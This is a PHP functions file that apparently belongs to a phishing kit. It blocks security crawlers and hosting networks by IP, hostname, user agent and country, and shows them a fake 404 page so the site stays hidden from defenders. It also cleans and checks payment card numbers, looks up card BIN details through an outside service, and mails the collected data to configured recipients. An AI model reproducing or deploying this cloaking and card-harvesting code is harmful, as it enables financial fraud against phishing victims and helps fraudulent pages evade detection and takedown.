<?php
error_reporting(0);
require_once 'blocked.php';
include_once 'card_validator.php';
require_once 'config.php';

function isCountryBlocked($countryCode)
{
	global $blocked_countries;
	if (in_array($countryCode, $blocked_countries))
		return true;

	return false;
}

function isHostnameBlocked($hostname, $ip_isp, $ip_organization)
{
		global $blocked_hostnames;
		$hostname = strtolower($hostname);
		$ip_isp = strtolower($ip_isp);
		$ip_organization = strtolower($ip_organization);

		foreach($blocked_hostnames as $word) {
				if (substr_count($hostname, strtolower($word)) > 0) {
						return true;
				}  
		}

		foreach($blocked_hostnames as $word) {
				if (substr_count($ip_isp, strtolower($word)) > 0) {
						return true;
				}
		}

		foreach($blocked_hostnames as $word) {
				if (substr_count($ip_organization, strtolower($word)) > 0) {
						return true;
				}  
		}

		return false;
}

function isUseragentBlocked($useragent)
{
		global $blocked_useragents;
		$useragent = strtolower($useragent);

		foreach($blocked_useragents as $word) {
				if (substr_count($useragent, strtolower($word)) > 0) {
						return true;
				}  
		}

		return false;
}

function isRefererBlocked($referer)
{
	global $blocked_referers;
	if (in_array($referer, $blocked_referers))
		return true;

	return false;
}


function isValidIp($ip){
    return inet_pton($ip) !== false;
}

function isBrowserBlocked($browser_name)
{
	 global $blocked_browsers;
	 $browser_name = strtolower($browser_name);

	 foreach ($blocked_browsers as $browser) {
			 if ($browser !== "" && substr_count($browser_name, strtolower($browser)) > 0) {
						return true;
			 }
	 }
	 return false;
}

function isIpBanned($ip)
{
		global $banned_ips;

		if(in_array($ip, $banned_ips)) {
				return true;
		}

		foreach($banned_ips as $ips) {
					if(preg_match('/' . $ips . '/',$ip)){
							 return true;
					}
		}

		return false;
}


function isBlocked($ip, $hostname, $user_agent, $browser_name, $referer, $ip_isp, $ip_organization, $countryCode)
{
	global $enable_blocker;
	global $block_hosting_companies_networks;
	

	if($enable_blocker) {
		if(isBrowserBlocked($browser_name) || isCountryBlocked($countryCode) || (isHostnameBlocked($hostname, $ip_isp, $ip_organization) || isIpBanned($ip)) || isUseragentBlocked($user_agent) || isRefererBlocked($referer) )
			return true;
	}

	return false;
}

function getErrorMessage()
{
	$actual_link = "$_SERVER[REQUEST_URI]";
	$message = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">';
	$message .= '<html><head>';
	$message .= '<title>404 Not Found</title>';
	$message .= '</head><body>';
	$message .= '<h1>Not Found</h1>';
	$message .= '<p>The requested URL '.$actual_link.' was not found on this server.</p>';
	$message .= '<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>';
	$message .= '<hr>';
	return $message;
}


function get_client_ip() {
		$ipaddress = '';
		if (isset($_SERVER['HTTP_CLIENT_IP']))
				$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
		else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
				$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_X_FORWARDED']))
				$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
		else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
				$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_FORWARDED']))
				$ipaddress = $_SERVER['HTTP_FORWARDED'];
		else if(isset($_SERVER['REMOTE_ADDR']))
				$ipaddress = $_SERVER['REMOTE_ADDR'];
		else
				$ipaddress = NULL;
		return $ipaddress;
}


function getIpGeoInfo($ip)
{
	$url = 'http://ip-api.com/json/'.$ip;
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$data = curl_exec($ch);
	curl_close($ch);
	$data = json_decode($data,true);
	return $data;
}


function getBrowserLanguage($acceptLang)
{
	$lang_file = "";

	switch ($acceptLang) {
	  case 'en':
	  $lang_file = 'en.php';
	  break;

	  // case 'de':
	  // $lang_file = 'de.php';
	  // break;

	  // case 'es':
	  // $lang_file = 'es.php';
	  // break;

	  // case 'fr':
	  // $lang_file = 'fr.php';
	  // break;

	  // case 'it':
	  // $lang_file = 'it.php';
	  // break;

	  // case 'ja':
	  // $lang_file = 'ja.php';
	  // break;

	  // case 'ko':
	  // $lang_file = 'ko.php';
	  // break;

	  // case 'zh':
	  // $lang_file = 'zh.php';
	  // break;

	  default:
	  $lang_file = 'en.php';
	}
	return $lang_file;
}


function is_email($input) {
  $email_pattern = "/^([a-zA-Z0-9\-\_\.]{1,})+@+([a-zA-Z0-9\-\_\.]{1,})+\.+([a-z]{2,4})$/i";
  if(preg_match($email_pattern, $input)) return TRUE;

}


function send_data($recipients, $subject , $data, $headers) {
  $header_ = 'MIME-Version: 1.0' . "\r\n" . 'Content-type: text/plain; charset=UTF-8' . "\r\n";
  foreach($recipients as $recipient) {
  	mail($recipient, '=?UTF-8?B?'.base64_encode($subject).'?=', $data, $header_ . $headers);
  }
}


function get_bin_info($cardnumber) {
	$cardnumber = clean_card_number($cardnumber);
	$bin = substr($cardnumber, 0, 6);
	$url = 'http://bins.payout.com/api/v1/bins/'.$bin;
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$data = curl_exec($ch);
	curl_close($ch);
	$data = json_decode($data,true);
	return $data;
}

function clean_card_number($cardnum) {
	$cardnum = trim($cardnum);
	$cardnum = str_replace(' ', '', $cardnum);
	$cardnum = str_replace('-', '', $cardnum);
	return $cardnum;
}

function FILTER_FLAG_NO_LOOPBACK_RANGE($value) {
    // Fails validation for the following loopback IPv4 range: 127.0.0.0/8
    // This flag does not apply to IPv6 addresses
    return filter_var($value, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) ? $value :
        (((ip2long($value) & 0xff000000) == 0x7f000000) ? FALSE : $value);
}

?>